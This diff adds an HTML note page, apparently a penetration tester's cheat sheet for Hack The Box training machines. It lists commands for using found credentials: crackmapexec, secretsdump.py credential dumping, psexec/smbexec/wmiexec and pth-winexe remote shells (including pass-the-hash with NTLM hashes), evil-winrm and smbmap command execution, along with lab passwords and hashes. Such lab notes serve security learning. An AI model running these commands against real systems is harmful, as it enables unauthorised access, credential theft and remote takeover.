@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>GotCreds???</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>GotCreds???</h1><br/>crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares<br /><br />./secretsdump.py htb.local/squid:YeeYeeYee@10.10.10.161<br /><br />psexec.py htb/administrator:PASSWORD@10.10.10.161<br />psexec.py htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -dc-ip 10.10.10.161<br /><br /><br />if psexec.py fails, try smbexec.py and wmiexec.py (syntax is identical)<br /><br />ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p &#39;Welcome123!&#39; <br />smbclient -h &#39;\\10.10.10.169\sysvol&#39; -U melanie -W megabank.local -I 10.10.10.169<br />smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami<br /><br /><br /><br />for real credsVV<br />winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe                  <br />    winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds<br /><br />for NTLM Hashes VV<br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe     <br />    pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds<br /><br /><br /><br /><br /><br /></div></body></html>
